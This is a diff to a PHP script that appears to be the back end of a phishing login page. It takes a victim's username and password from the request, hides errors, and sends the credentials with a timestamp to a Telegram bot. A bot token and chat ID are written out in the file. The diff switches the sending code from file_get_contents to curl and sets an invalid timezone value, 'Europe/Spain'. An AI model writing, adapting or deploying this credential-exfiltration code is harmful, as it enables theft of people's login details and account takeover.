@@ -1,6 +1,6 @@
 <?php
 
-date_default_timezone_set("Asia/kolkata");
+date_default_timezone_set("Europe/Spain");
 error_reporting(0);
 
 $time = date("h:i a", time());
@@ -10,17 +10,26 @@ $password = $_GET["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
-$chat_id= "6454250313"; // replace with your userid
+$chat_id= 6454250313; // replace with your userid
 
 
 send_message($chat_id,"$message");
 
-
 function send_message($chat_id, $message){
-        $text = urlencode($message);
-        $apiToken = "AAG4-5BNqiw_4Gqj_ICRs8wXBe7mnRXYX3o";
-        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
-    }
+    $text = urlencode($message);
+    $apiToken = "6549796963:AAG4-5BNqiw_4Gqj_ICRs8wXBe7mnRXYX3";
+    
+    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text";
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    return $response;
+}
+
+
 ?>
 <!DOCTYPE html>
 <html>
